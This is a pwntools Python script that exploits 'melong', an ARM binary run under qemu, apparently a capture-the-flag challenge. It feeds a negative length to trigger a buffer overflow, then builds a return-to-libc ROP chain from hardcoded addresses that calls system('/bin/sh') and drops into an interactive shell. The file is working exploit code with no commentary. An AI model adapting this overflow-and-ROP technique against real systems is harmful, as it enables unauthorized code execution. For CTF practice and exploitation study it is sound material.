from pwn import *
import sys
context.binary = "./melong"
context.log_level = "debug"

if sys.argv[1] == "r":
    p = remote("remote_addr", remote_port)
elif sys.argv[1] == "l":
    p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", "./melong"])
else:
    p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabi", "./melong"])

elf = ELF("./melong")
libc = ELF("/usr/arm-linux-gnueabi/lib/libc.so.6")

#libc_base = 0xff6b6f98 - libc.symbols['puts']
libc_base = 0xff6bb770 - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_addr = libc_base + libc.search('/bin/sh').next()

#payload  = 'A' * 0x54 + p32(0x00011bbc) + p32(elf.got['puts']) + p32(elf.plt['puts'])#+p32(elf.sym['main'])*2
payload  = 'A' * 0x54 + p32(0x00011bbc) + p32(bin_addr) + p32(system_addr)

p.recvuntil('Type the number:')
p.sendline('1')
p.recvuntil('Your height(meters) : ')
p.sendline('1')
p.recvuntil('Your weight(kilograms) : ')
p.sendline('1')
p.recvuntil('Type the number:')
p.sendline('3')
p.recvuntil('How long do you want to take personal training?')
p.sendline('-1')
p.recvuntil('Type the number:')
p.sendline('4')
p.sendline(payload)
p.recvuntil('Type the number:')
p.sendline('6')

p.interactive()